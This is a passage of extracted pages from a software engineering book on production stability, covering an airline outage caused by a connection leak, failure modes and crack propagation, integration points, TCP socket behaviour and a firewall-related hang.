statement throws an exception, then the connection does not get closed, resulting in a resource leak. After forty of these calls, the resource pool is exhausted and all future calls will block at connectionPool.getConnection(). That is exactly what I saw in the thread dumps from CF.\n\nThe entire globe-spanning, multibillion dollar airline with its hundreds of aircraft and tens of thousands of employees was grounded by one program- mer’s error: a single uncaught SQLException.\n\nAn Ounce of Prevention?\n\nWhen such staggering costs result from such a small error, the natural response is to say, “This must never happen again.” (I’ve seen ops managers pound their shoes on a table like Nikita Khrushchev while declaring, “This must never happen again.”) But how can it be prevented? Would a code review have caught this bug? Only if one of the reviewers knew the internals of Oracle’s JDBC driver or the review team spent hours on each method. Would more testing have prevented this bug? Perhaps. Once the problem was iden- tified, the team performed a test in the stress test environment that did\n\nreport erratum • discuss",
      "content_length": 2648,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 34,
      "content": "An Ounce of Prevention? • 21\n\ndemonstrate the same error. The regular test profile didn’t exercise this method enough to show the bug. In other words, once you know where to look, it’s simple to make a test that finds it.\n\nUltimately, it’s just fantasy to expect every single bug like this one to be driven out. Bugs will happen. They cannot be eliminated, so they must be survived instead.\n\nThe worst problem here is that the bug in one system could propagate to all the other affected systems. A better question to ask is, “How do we prevent bugs in one system from affecting everything else?” Inside every enterprise today is a mesh of interconnected, interdependent systems. They cannot— must not—allow bugs to cause a chain of failures. We’re going to look at design patterns that can prevent this type of problem from spreading.\n\nreport erratum • discuss",
      "content_length": 860,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 35,
      "content": "CHAPTER 3\n\nStabilize Your System\n\nNew software emerges like a new college graduate: full of optimistic vigor, suddenly facing the harsh realities of the world outside the lab. Things happen in the real world that just do not happen in the lab—usually bad things. In the lab, all the tests are contrived by people who know what answer they expect to get. The challenges your software encounters in the real world don’t have such neat answers.\n\nEnterprise software must be cynical. Cynical software expects bad things to happen and is never surprised when they do. Cynical software doesn’t even trust itself, so it puts up internal barriers to protect itself from failures. It refuses to get too intimate with other systems, because it could get hurt.\n\nThe airline’s Core Facilities project discussed in Chapter 2, Case Study: The Exception That Grounded an Airline, on page 9, was not cynical enough. As so often happens, the team got caught up in the excitement of new tech- nology and advanced architecture. It had lots of great things to say about leverage and synergy. Dazzled by the dollar signs, it didn’t see the stop sign and took a turn for the worse.\n\nPoor stability carries significant real costs. The obvious cost is lost revenue. The retailer from Chapter 1, Living in Production, on page 1, loses $1,000,000 per hour of downtime, and that’s during the off-season. Trading systems can lose that much in a single missed transaction!\n\nIndustry studies show that it costs up to $150 for an online retailer to acquire a customer. With 5,000 unique visitors per hour, assume 10 percent of those would-be visitors walk away for good. That’s $75,000 in wasted marketing.1\n\n1.\n\nhttp://kurtkummerer.com/customer-acquisition-cost\n\nreport erratum • discuss",
      "content_length": 1757,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 36,
      "content": "Chapter 3. Stabilize Your System • 24\n\nLess tangible, but just as painful, is lost reputation. Tarnish to the brand might be less immediately obvious than lost customers, but try having your holiday-season operational problems reported in Bloomberg Businessweek. Millions of dollars in image advertising—touting online customer service— can be undone in a few hours by a batch of bad hard drives.\n\nGood stability does not necessarily cost a lot. When building the architecture, design, and even low-level implementation of a system, many decision points have high leverage over the system’s ultimate stability. Confronted with these leverage points, two paths might both satisfy the functional requirements (aiming for QA). One will lead to hours of downtime every year, while the other will not. The amazing thing is that the highly stable design usually costs the same to implement as the unstable one.\n\nDefining Stability\n\nTo talk about stability, we need to define some terms. A transaction is an abstract unit of work processed by the system. This is not the same as a database transaction. A single unit of work might encompass many database transactions. In an e-commerce site, for example, one common type of transaction is “customer places order.” This transaction spans several pages, often including external integrations such as credit card verification. Trans- actions are the reason that the system exists. A single system can process just one type of transaction, making it a dedicated system. A mixed workload is a combination of different transaction types processed by a system.\n\nThe word system means the complete, interdependent set of hardware, applications, and services required to process transactions for users. A system might be as small as a single application, or it might be a sprawling, multitier network of applications and servers.\n\nA robust system keeps processing transactions, even when transient impulses, persistent stresses, or component failures disrupt normal process- ing. This is what most people mean by “stability.” It’s not just that your indi- vidual servers or applications stay up and running but rather that the user can still get work done.\n\nThe terms impulse and stress come from mechanical engineering. An impulse is a rapid shock to the system. An impulse to the system is when something whacks it with a hammer. In contrast, stress to the system is a force applied to the system over an extended period.\n\nA flash mob pounding the PlayStation 6 product detail page, thanks to a rumor that such a thing exists, causes an impulse. Ten thousand new sessions,\n\nreport erratum • discuss",
      "content_length": 2634,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 37,
      "content": "Extending Your Life Span • 25\n\nall arriving within one minute of each other, is very difficult for any service instance to withstand. A celebrity tweet about your site is an impulse. Dumping twelve million messages into a queue at midnight on November 21 is an impulse. These things can fracture the system in the blink of an eye.\n\nOn the other hand, getting slow responses from your credit card processor because it doesn’t have enough capacity for all of its customers is a stress to the system. In a mechanical system, a material changes shape when stress is applied. This change in shape is called the strain. Stress produces strain. The same thing happens with computer systems. The stress from the credit card processor will cause strain to propagate to other parts of the system, which can produce odd effects. It could manifest as higher RAM usage on the web servers or excess I/O rates on the database server or as some other far distant effect.\n\nA system with longevity keeps processing transactions for a long time. What is a long time? It depends. A useful working definition of “a long time” is the time between code deployments. If new code is deployed into production every week, then it doesn’t matter if the system can run for two years without rebooting. On the other hand, a data collector in western Montana really shouldn’t need to be rebooted by hand once a week. (Unless you want to live in western Montana, that is.)\n\nExtending Your Life Span\n\nThe major dangers to your system’s longevity are memory leaks and data growth. Both kinds of sludge will kill your system in production. Both are rarely caught during testing.\n\nTesting makes problems visible so you can fix them. Following Murphy’s Law, whatever you do not test against will happen. Therefore, if you do not test for crashes right after midnight or out-of-memory errors in the application’s forty- ninth hour of uptime, those crashes will happen. If you do not test for mem- ory leaks that show up only after seven days, you will have memory leaks after seven days.\n\nThe trouble is that applications never run long enough in the development environment to reveal their longevity bugs. How long do you usually keep an application server running in your development environment? I’ll bet the average life span is less than the length of a sitcom on Netflix. In QA, it might run a little longer but probably still gets recycled at least daily, if not more often. Even when it is up and running, it’s not under continuous load. These\n\nreport erratum • discuss",
      "content_length": 2539,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 38,
      "content": "Chapter 3. Stabilize Your System • 26\n\nenvironments are not conducive to long-running tests, such as leaving the server running for a month under daily traffic.\n\nThese sorts of bugs usually aren’t caught by load testing either. A load test runs for a specified period of time and then quits. Load-testing vendors charge large dollars per hour, so nobody asks them to keep the load running for a week at a time. Your development team probably shares the corporate network, so you can’t disrupt such vital corporate activities as email and web browsing for days at a time.\n\nSo how do you find these kinds of bugs? The only way you can catch them before they bite you in production is to run your own longevity tests. If you can, set aside a developer machine. Have it run JMeter, Marathon, or some other load-testing tool. Don’t hit the system hard; just keep driving requests all the time. (Also, be sure to have the scripts slack for a few hours a day to simulate the slow period during the middle of the night. That will catch con- nection pool and firewall timeouts.)\n\nSometimes the economics don’t justify setting up a complete environment. If not, at least try to test important parts while stubbing out the rest. It’s still better than nothing.\n\nIf all else fails, production becomes your longevity testing environment by default. You’ll definitely find the bugs there, but it’s not a recipe for a happy lifestyle.\n\nFailure Modes\n\nSudden impulses and excessive strain can both trigger catastrophic failure. In either case, some component of the system will start to fail before everything else does. In Inviting Disaster [Chi01], James R. Chiles refers to these as “cracks in the system.” He draws an analogy between a complex system on the verge of failure and a steel plate with a microscopic crack in the metal. Under stress, that crack can begin to propagate faster and faster. Eventually, the crack propagates faster than the speed of sound and the metal breaks explosively. The original trigger and the way the crack spreads to the rest of the system, together with the result of the damage, are collectively called a failure mode.\n\nNo matter what, your system will have a variety of failure modes. Denying the inevitability of failures robs you of your power to control and contain them. Once you accept that failures will happen, you have the ability to design your system’s reaction to specific failures. Just as auto engineers create crumple zones—areas designed to protect passengers by failing first—you can\n\nreport erratum • discuss",
      "content_length": 2550,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 39,
      "content": "Stopping Crack Propagation • 27\n\ncreate safe failure modes that contain the damage and protect the rest of the system. This sort of self-protection determines the whole system’s resilience.\n\nChiles calls these protections “crackstoppers.” Like building crumple zones to absorb impacts and keep car passengers safe, you can decide what features of the system are indispensable and build in failure modes that keep cracks away from those features. If you do not design your failure modes, then you’ll get whatever unpredictable—and usually dangerous—ones happen to emerge.\n\nStopping Crack Propagation\n\nLet’s see how the design of failure modes applies to the grounded airline from before. The airline’s Core Facilities project had not planned out its failure modes. The crack started at the improper handling of the SQLException, but it could have been stopped at many other points. Let’s look at some examples, from low-level detail to high-level architecture.\n\nBecause the pool was configured to block requesting threads when no resources were available, it eventually tied up all request-handling threads. (This happened independently in each application server instance.) The pool could have been configured to create more connections if it was exhausted. It also could have been configured to block callers for a limited time, instead of blocking forever when all connections were checked out. Either of these would have stopped the crack from propagating.\n\nAt the next level up, a problem with one call in CF caused the calling applica- tions on other hosts to fail. Because CF exposed its services as Enterprise JavaBeans (EJBs), it used RMI. By default, RMI calls will never time out. In other words, the callers blocked waiting to read their responses from CF’s EJBs. The first twenty callers to each instance received exceptions: a SQLException wrapped in an InvocationTargetException wrapped in a RemoteException, to be precise. After that, the calls started blocking.\n\nThe client could have been written to set a timeout on the RMI sockets. For example, it could have installed a socket factory that calls Socket.setSoTimeout() on all new sockets it creates. At a certain point in time, CF could also have decided to build an HTTP-based web service instead of EJBs. Then the client could set a timeout on its HTTP requests. The clients might also have written their calls so the blocked threads could be jettisoned, instead of having the request-handling thread make the external integration call. None of these were done, so the crack propagated from CF to all systems that used CF.\n\nAt a still larger scale, the CF servers themselves could have been partitioned into more than one service group. That would have kept a problem within\n\nreport erratum • discuss",
      "content_length": 2771,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 40,
      "content": "Chapter 3. Stabilize Your System • 28\n\none of the service groups from taking down all users of CF. (In this case, all the service groups would have cracked in the same way, but that would not always be the case.) This is another way of stopping cracks from propagating into the rest of the enterprise.\n\nLooking at even larger architecture issues, CF could’ve been built using request/reply message queues. In that case, the caller would know that a reply might never arrive. It would have to deal with that case as part of han- dling the protocol itself. Even more radically, the callers could have been searching for flights by looking for entries in a tuple space that matched the search criteria. CF would have to have kept the tuple space populated with flight records. The more tightly coupled the architecture, the greater the chance this coding error can propagate. Conversely, the less-coupled archi- tectures act as shock absorbers, diminishing the effects of this error instead of amplifying them.\n\nAny of these approaches could have stopped the SQLException problem from spreading to the rest of the airline. Sadly, the designers had not considered the possibility of “cracks” when they created the shared services.\n\nChain of Failure\n\nUnderneath every system outage is a chain of events like this. One small issue leads to another, which leads to another. Looking at the entire chain of failure after the fact, the failure seems inevitable. If you tried to estimate the probability of that exact chain of events occurring, it would look incredibly improbable. But it looks improbable only if you consider the probability of each event independently. A coin has no memory; each toss has the same probability, independent of previous tosses. The combination of events that caused the failure is not independent. A failure in one point or layer actually increases the probability of other failures. If the database gets slow, then the application servers are more likely to run out of memory. Because the layers are coupled, the events are not independent.\n\nHere’s some common terminology we can use to be precise about these chains of events:\n\nFault\n\nA condition that creates an incorrect internal state in your software. A fault may be due to a latent bug that gets triggered, or it may be due to an unchecked condition at a boundary or external interface.\n\nError Visibly incorrect behavior. When your trading system suddenly buys\n\nten billion dollars of Pokemon futures, that is an error.\n\nreport erratum • discuss",
      "content_length": 2525,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 41,
      "content": "Chain of Failure • 29\n\nFailure An unresponsive system. When a system doesn’t respond, we say it has failed. Failure is in the eye of the beholder...a computer may have the power on but not respond to any requests.\n\nTriggering a fault opens the crack. Faults become errors, and errors provoke failures. That’s how the cracks propagate.\n\nAt each step in the chain of failure, the crack from a fault may accelerate, slow, or stop. A highly complex system with many degrees of coupling offers more pathways for cracks to propagate along, more opportunities for errors.\n\nTight coupling accelerates cracks. For instance, the tight coupling of EJB calls allowed a resource exhaustion problem in CF to create larger problems in its callers. Coupling the request-handling threads to the external integration calls in those systems caused a remote problem to turn into downtime.\n\nOne way to prepare for every possible failure is to look at every external call, every I/O, every use of resources, and every expected outcome and ask, “What are all the ways this can go wrong?” Think about the different types of impulse and stress that can be applied:\n\nWhat if it can’t make the initial connection?\n\nWhat if it takes ten minutes to make the connection?\n\nWhat if it can make the connection and then gets disconnected?\n\nWhat if it can make the connection but doesn’t get a response from the\n\nother end?\n\nWhat if it takes two minutes to respond to my query?\n\nWhat if 10,000 requests come in at the same time?\n\nWhat if the disk is full when the application tries to log the error message about the SQLException that happened because the network was bogged down with a worm?\n\nThat’s just the beginning of everything that can go wrong. The exhaustive brute-force approach is clearly impractical for anything but life-critical systems or Mars rovers. What if you actually have to deliver in this decade?\n\nOur community is divided about how to handle faults. One camp says we need to make systems fault-tolerant. We should catch exceptions, check error codes, and generally keep faults from turning into errors. The other camp says it’s futile to aim for fault tolerance. It’s like trying to make a fool-proof device: the universe will always deliver a better fool. No matter what faults\n\nreport erratum • discuss",
      "content_length": 2293,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 42,
      "content": "Chapter 3. Stabilize Your System • 30\n\nyou try to catch and recover from, something unexpected will always occur. This camp says “let it crash” so you can restart from a known good state.\n\nBoth camps agree on two things, though. Faults will happen; they can never be completely prevented. And we must keep faults from becoming errors. You have to decide for your system whether it’s better to risk failure or errors— even while you try to prevent failures and errors. We’ll look at some patterns that let you create shock absorbers to relieve those stresses.\n\nWrapping Up\n\nEvery production failure is unique. No two incidents will share the precise chain of failure: same triggers, same fracture, same propagation. Over time, however, patterns of failure do emerge. A certain brittleness along an axis, a tendency for this problem to amplify that way. These are the stability antipatterns. Chapter 4, Stability Antipatterns, on page 31, deals with these patterns of failure.\n\nIf there are systematic patterns of failure, you might imagine that some common solutions would apply. You would be correct. Chapter 5, Stability Patterns, on page 91, deals with design and architecture patterns to defeat the antipatterns. These patterns cannot prevent cracks in the system. Nothing can. Some set of conditions will always trigger a crack. But these patterns stop cracks from propagating. They help contain damage and preserve partial functionality instead of allowing total failures.\n\nFirst, the bad news. We must travel through the valley of shadows before we can reach the plateau of enlightenment. In other words, it’s time to look at the antipatterns that will kill your systems.\n\nreport erratum • discuss",
      "content_length": 1703,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 43,
      "content": "CHAPTER 4\n\nStability Antipatterns\n\nDelegates to the first NATO Software Engineering Conference coined the term software crisis in 1968. They meant that demand for new software outstripped the capacity of all existing programmers worldwide. If that truly was the start of the software crisis, then it has never ended! (Interestingly, that conference also appears to be the origin of the term software engineering. Some reports say it was named that way so certain attendees would be able to get their travel expenses approved. I guess that problem hasn’t changed much either.) Our machines have gotten better by orders of magnitude. So have the languages and libraries. The enormous leverage of open source multiplies our abilities. And of course, something like a million times more programmers are in the world now than there were in 1968. So overall, our ability to create software has had its own kind of Moore’s law exponential curve at work. So why are we still in a software crisis? Because we’ve steadily taken on bigger and bigger challenges.\n\nIn those hazy days of the client/server system, we used to think of a hundred active users as a large system; now we think about millions. (And that’s up from the first edition of this book, when ten thousand active users was a lot.) We’ve just seen our first billion-user site. In 2016, Facebook announced that it has 1.13 billion daily active users.1 An “application” now consists of dozens or hun- dreds of services, each running continuously while being redeployed continu- ously. Five nines of reliability for the overall application is nowhere near enough. It would result in thousands of disappointed users every day. Six Sigma quality on Facebook would create 768,000 angry users per day. (200 requests per page, 1.13 billion daily active users, 3.4 defects per million opportunities.)\n\nThe breadth of our applications’ reach has exploded, too. Everything within the enterprise is interconnected, and then again as we integrate across\n\n1.\n\nhttp://venturebeat.com/2016/07/27/facebook-passes-1-billion-mobile-daily-active-users\n\nreport erratum • discuss",
      "content_length": 2111,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 44,
      "content": "Chapter 4. Stability Antipatterns • 32\n\nenterprises. Even the boundaries of our applications have become fuzzy as more features are delegated to SaaS services.\n\nOf course, this also means bigger challenges. As we integrate the world, tightly coupled systems are the rule rather than the exception. Big systems serve more users by commanding more resources; but in many failure modes big systems fail faster than small systems. The size and the complexity of these systems push us to what author James R. Chiles calls in Inviting Disaster [Chi01] the “technology frontier,” where the twin specters of high interactive complexity and tight coupling conspire to turn rapidly moving cracks into full-blown failures.\n\nHigh interactive complexity arises when systems have enough moving parts and hidden, internal dependencies that most operators’ mental models are either incomplete or just plain wrong. In a system exhibiting high interactive complexity, the operator’s instinctive actions will have results ranging from ineffective to actively harmful. With the best of intentions, the operator can take an action based on his or her own mental model of how the system functions that triggers a completely unexpected linkage. Such linkages con- tribute to “problem inflation,” turning a minor fault into a major failure. For example, hidden linkages in cooling monitoring and control systems are partly to blame for the Three Mile Island reactor incident, as Chiles outlines in his book. These hidden linkages often appear obvious during the post- mortem analysis, but are in fact devilishly difficult to anticipate.\n\nTight coupling allows cracks in one part of the system to propagate themselves —or multiply themselves—across layer or system boundaries. A failure in one component causes load to be redistributed to its peers and introduces delays and stress to its callers. This increased stress makes it extremely likely that another component in the system will fail. That in turn makes the next failure more likely, eventually resulting in total collapse. In your systems, tight coupling can appear within application code, in calls between systems, or any place a resource has multiple consumers.\n\nIn the next chapter, we’ll look at some patterns that can alleviate or prevent the antipatterns from harming your system. Before we can get to that good news, though, we need to understand what we’re up against.\n\nIn this chapter, we’ll look at antipatterns that can wreck your system. These are common forces that have contributed to more than one system failure. Each of these antipatterns will create, accelerate, or multiply cracks in the system. These bad behaviors are to be avoided.\n\nreport erratum • discuss",
      "content_length": 2715,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 45,
      "content": "Integration Points • 33\n\nSimply avoiding these antipatterns isn’t sufficient, though. Everything breaks. Faults are unavoidable. Don’t pretend you can eliminate every possible source of them, because either nature or nurture will create bigger disasters to wreck your systems. Assume the worst. Faults will happen. We need to examine what happens after the fault creeps in.\n\nIntegration Points\n\nI haven’t seen a straight-up “website” project since about 1996. Everything is an integration project with some combination of HTML veneer, front-end app, API, mobile app, or all of the above. The context diagram for these projects will fall into one of two patterns: the butterfly or the spider. A butterfly has a central system with a lot of feeds and connections fanning into it on one side and a large fan out on the other side, as shown in the figure that follows.\n\nUserRole\n\nDownstream\n\nSystemBoundary\n\nProvider\n\nProvider\n\nProvider\n\nCaller\n\nCaller\n\nDownstream\n\nUserRole\n\nCaller\n\nSome people would call this a monolith, but that has negative connotations. It might be a nicely factored system that just has a lot of responsibility.\n\nThe other style is the spiderweb, with many boxes and dependencies. If you’ve been diligent (and maybe a bit lucky), the boxes fall into ranks with calls through tiers, as shown in the first figure on page 34. If not, then the web will be chaotic like that of the black widow, shown in the second figure on page 34. The feature common to all of these is that the connections outnumber the services. A butterfly style has 2N connections, a spiderweb might have up to\n\n2N\n\n, and yours falls somewhere in between.\n\nreport erratum • discuss",
      "content_length": 1669,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 46,
      "content": "Chapter 4. Stability Antipatterns • 34\n\nSvc\n\nSvc\n\nSvc\n\nUserRole\n\nUserRole\n\nCaller\n\nCaller\n\nCaller\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nUpstream\n\nDownstream\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nUserRole\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nSvc\n\nUserRole\n\nAll these connections are integration points, and every single one of them is out to destroy your system. In fact, the more we move toward a large number of smaller services, the more we integrate with SaaS providers, and the more we go API first, the worse this is going to get.\n\nreport erratum • discuss",
      "content_length": 546,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 47,
      "content": "Integration Points • 35\n\nYou Have How Many Feeds?\n\nI was helping launch a replatform/rearchitecture project for a huge retailer. It came time to identify all the production firewall rules so we could open holes in the firewall to allow authorized connections to the production system. We had already gone through the usual suspects: the web servers’ connections to the application server, the application server to the database server, the cluster manager to the cluster nodes, and so on.\n\nWhen it came time to add rules for the feeds in and out of the production environment, we were pointed toward the project manager for enterprise integration. That’s right, the site rebuild project had its own project manager dedicated just to integration. That was our second clue that this was not going to be a simple task. (The first clue was that nobody else could tell us what all the feeds were.) The project manager understood exactly what we needed. He pulled up his database of integrations and ran a custom report to give us the connection specifics.\n\nFeeds came in from inventory, pricing, content management, CRM, ERP, MRP, SAP, WAP, BAP, BPO, R2D2, and C3P0. Data extracts flew off toward CRM, fulfillment, booking, authorization, fraud checking, address normalization, scheduling, shipping, and so on.\n\nOn the one hand, I was impressed that the project manager had a fully populated database to keep track of the various feeds (synchronous/asynchronous, batch or trickle feed, source system, frequency, volume, cross-reference numbers, business stakeholder, and so on). On the other hand, I was dismayed that he needed a database to keep track of it!\n\nIt probably comes as no surprise, then, that the site was plagued with stability problems when it launched. It was like having a newborn baby in the house; I was awakened every night at 3 a.m. for the latest crash or crisis. We kept documenting the spots where the app crashed and feeding them back to the maintenance team for correction. I never kept a tally, but I’m sure that every single synchronous integration point caused at least one outage.\n\nIntegration points are the number-one killer of systems. Every single one of those feeds presents a stability risk. Every socket, process, pipe, or remote procedure call can and will hang. Even database calls can hang, in ways obvious and subtle. Every feed into the system can hang it, crash it, or generate other impulses at the worst possible time. We’ll look at some of the specific ways these integration points can go bad and what you can do about them.\n\nSocket-Based Protocols\n\nMany higher-level integration protocols run over sockets. In fact, pretty much everything except named pipes and shared-memory IPC is socket-based. The\n\nreport erratum • discuss",
      "content_length": 2769,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 48,
      "content": "Chapter 4. Stability Antipatterns • 36\n\nhigher protocols introduce their own failure modes, but they’re all susceptible to failures at the socket layer.\n\nThe simplest failure mode occurs when the remote system refuses connections. The calling system must deal with connection failures. Usually, this isn’t much of a problem, since everything from C to Java to Elm has clear ways to indicate a connection failure—either an exception in languages that have them or a magic return value in ones that don’t. Because the API makes it clear that connections don’t always work, programmers deal with that case.\n\nOne wrinkle to watch out for, though, is that it can take a long time to discover that you can’t connect. Hang on for a quick dip into the details of TCP/IP networking.\n\nEvery architecture diagram ever drawn has boxes and arrows, similar to the ones in the following figure. (A new architect will focus on the boxes; an experienced one is more interested in the arrows.)\n\nRemote Server\n\nLocal Server\n\nCaller\n\nProvider\n\nLike a lot of other things we work with, this arrow is an abstraction for a network connection. Really, though, that means it’s an abstraction for an abstraction. A network “connection” is a logical construct—an abstraction—in its own right. All you will ever see on the network itself are packets. (Of course, a “packet” is an abstraction, too. On the wire, it’s just electrons or photons. Between electrons and a TCP connection are many layers of abstraction. Fortunately, we get to choose whichever level of abstraction is useful at any given point in time.) These packets are the Internet Protocol (IP) part of TCP/IP. Transmission Control Protocol (TCP) is an agreement about how to make something that looks like a continuous connection out of discrete packets. The figure on page 37 shows the “three-way handshake” that TCP defines to open a connection.\n\nThe connection starts when the caller (the client in this scenario, even though it is itself a server for other applications) sends a SYN packet to a port on the remote server. If nobody is listening to that port, the remote server immedi- ately sends back a TCP “reset” packet to indicate that nobody’s home. The calling application then gets an exception or a bad return value. All this\n\nreport erratum • discuss",
      "content_length": 2300,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 49,
      "content": "Integration Points • 37\n\nRemote Server\n\nLocal Server\n\nProvidingService\n\n2. SYN/ACK CallingService1. SYN\n\n3. ACK time\n\nhappens very quickly, in less than ten milliseconds if both machines are plugged into the same switch.\n\nIf an application is listening to the destination port, then the remote server sends back a SYN/ACK packet indicating its willingness to accept the connec- tion. The caller gets the SYN/ACK and sends back its own ACK. These three packets have now established the “connection,” and the applications can send data back and forth. (For what it’s worth, TCP also defines the “simultaneous open” handshake, in which both machines send SYN packets to each other before a SYN/ACK. This is relatively rare in systems that are based on client/server interactions.)\n\nSuppose, though, that the remote application is listening to the port but is absolutely hammered with connection requests, until it can no longer service the incoming connections. The port itself has a “listen queue” that defines how many pending connections (SYN sent, but no SYN/ACK replied) are allowed by the network stack. Once that listen queue is full, further connection attempts are refused quickly. The listen queue is the worst place to be. While the socket is in that partially formed state, whichever thread called open() is blocked inside the OS kernel until the remote application finally gets around to accepting the connection or until the connection attempt times out. Con- nection timeouts vary from one operating system to another, but they’re usually measured in minutes! The calling application’s thread could be blocked waiting for the remote server to respond for ten minutes!\n\nNearly the same thing happens when the caller can connect and send its request but the server takes a long time to read the request and send a response. The read() call will just block until the server gets around to responding. Often, the default is to block forever. You have to set the socket timeout if you want to break out of the blocking call. In that case, be prepared for an exception when the timeout occurs.\n\nNetwork failures can hit you in two ways: fast or slow. Fast network failures cause immediate exceptions in the calling code. “Connection refused” is a very\n\nreport erratum • discuss",
      "content_length": 2283,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 50,
      "content": "Chapter 4. Stability Antipatterns • 38\n\nfast failure; it takes a few milliseconds to come back to the caller. Slow failures, such as a dropped ACK, let threads block for minutes before throwing exceptions. The blocked thread can’t process other transactions, so overall capacity is reduced. If all threads end up getting blocked, then for all practical purposes, the server is down. Clearly, a slow response is a lot worse than no response.\n\nThe 5 A.M. Problem\n\nOne of the sites I launched developed a nasty pattern of hanging completely at almost exactly 5 a.m. every day. The site was running on around thirty different instances, so something was happening to make all thirty different application server instances hang within a five-minute window (the resolution of our URL pinger). Restarting the application servers always cleared it up, so there was some transient effect that tipped the site over at that time. Unfortunately, that was just when traffic started to ramp up for the day. From midnight to 5 a.m., only about 100 transactions per hour were of interest, but the numbers ramped up quickly once the East Coast started to come online (one hour ahead of us central time folks). Restarting all the application servers just as people started to hit the site in earnest was what you’d call a suboptimal approach.\n\nOn the third day that this occurred, I took thread dumps from one of the afflicted application servers. The instance was up and running, but all request- handling threads were blocked inside the Oracle JDBC library, specifically inside of OCI calls. (We were using the thick-client driver for its superior failover features.) In fact, once I eliminated the threads that were just blocked trying to enter a synchronized method, it looked as if the active threads were all in low-level socket read or write calls.\n\nPacket Capture\n\nAbstractions provide great conciseness of expression. We can go much faster when we talk about fetching a document from a URL than if we have to discuss the tedious details of connection setup, packet framing, acknowledgments, receive windows, and so on. With every abstraction, however, the time comes when you must peel the onion, shed some tears, and see what’s really going on—usually when something is going wrong. Whether for a problem diagnosis or performance tuning, packet capture tools are the only way to understand what’s really happening on the network.\n\ntcpdump is a common UNIX tool for capturing packets from a network interface. Running it in “promiscuous” mode instructs the network interface card (NIC) to receive all packets that cross its wire—even those addressed to other computers. Wireshark can sniff packets on the wire,a as tcpdump does, but it can also show the packets’ structure in a GUI.\n\nreport erratum • discuss",
      "content_length": 2799,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 51,
      "content": "Integration Points • 39\n\nWireshark runs on the X Window System. It requires a bunch of libraries that might not even be installed in a Docker container or an AWS instance. So it’s best to capture packets noninteractively using tcpdump and then move the capture file to a nonproduc- tion environment for analysis.\n\nThe following screenshot shows Wireshark (then called “Ethereal”) analyzing a capture from my home network. The first packet shows an address routing protocol (ARP) request. This happens to be a question from my wireless bridge to my cable modem. The next packet was a surprise: an HTTP query to Google, asking for a URL called /safebrowsing/lookup with some query parameters. The next two packets show a DNS query and response for the “michaelnygard.dyndns.org” hostname. Packets 5, 6, and 7 are the three-phase handshake for a TCP connection setup. We can trace the entire conversation between my web browser and server. Note that the pane below the packet trace shows the layers of encapsulation that the TCP/IP stack created around the HTTP request in the second packet. The outermost frame is an Ethernet packet. The Ethernet packet contains an IP packet, which in turn contains a TCP packet. Finally, the payload of the TCP packet is an HTTP request. The exact bytes of the entire packet appear in the third pane.\n\nRunning packet traces is an educational activity. I strongly recommend it, but I must offer two comments. First, don’t do it on a network unless you are specifically granted permission! Second, keep a copy of The TCP/IP Guide [Koz05] or TCP/IP Illustrated [Ste93] open beside you.\n\na.\n\nwww.wireshark.org\n\nreport erratum • discuss",
      "content_length": 1664,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 52,
      "content": "Chapter 4. Stability Antipatterns • 40\n\nThe next step was tcpdump and ethereal (now called Wireshark). The odd thing was how little that showed. A handful of packets were being sent from the application servers to the database servers, but with no replies. Also, nothing was coming from the database to the application servers. Yet monitoring showed that the database was alive and healthy. There were no blocking locks, the run queue was at zero, and the I/O rates were trivial.\n\nBy this time, we had to restart the application servers. Our first priority was restoring service. (We do data collection when we can, but not at the risk of breaking an SLA.) Any deeper investigation would have to wait until the issue happened again. None of us doubted that it would happen again.\n\nSure enough, the pattern repeated itself the next morning. Application servers locked up tight as a drum, with the threads inside the JDBC driver. This time, I was able to look at traffic on the databases’ network. Zilch. Nothing at all. The utter absence of traffic on that side of the firewall was like Sherlock Holmes’ dog that didn’t bark in the night—the absence of activity was the biggest clue. I had a hypothesis. Quick decompilation of the application server’s resource pool class confirmed that my hypothesis was plausible.\n\nI said before that socket connections are an abstraction. They exist only as objects in the memory of the computers at the endpoints. Once established, a TCP connection can exist for days without a single packet being sent by either side. As long as both computers have that socket state in memory, the “connection” is still valid. Routes can change, and physical links can be sev- ered and reconnected. It doesn’t matter; the “connection” persists as long as the two computers at the endpoints think it does.\n\nIn the innocent days of DARPAnet and EDUnet, that all worked beautifully well. Pretty soon after AOL connected to the Internet, though, we discovered the need for firewalls. Such paranoid little bastions have broken the philosophy and implementation of the whole Net.\n\nA firewall is nothing but a specialized router. It routes packets from one set of physical ports to another. Inside each firewall, a set of access control lists define the rules about which connections it will allow. The rules say such things as “connections originating from 192.0.2.0/24 to 192.168.1.199 port 80 are allowed.” When the firewall sees an incoming SYN packet, it checks it against its rule base. The packet might be allowed (routed to the destination network), rejected (TCP reset packet sent back to origin), or ignored (dropped on the floor with no response at all). If the connection is allowed, then the firewall makes an entry in its own internal table that says something like “192.0.2.98:32770 is connected to 192.168.1.199:80.” Then all future packets,\n\nreport erratum • discuss",
      "content_length": 2897,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 53,
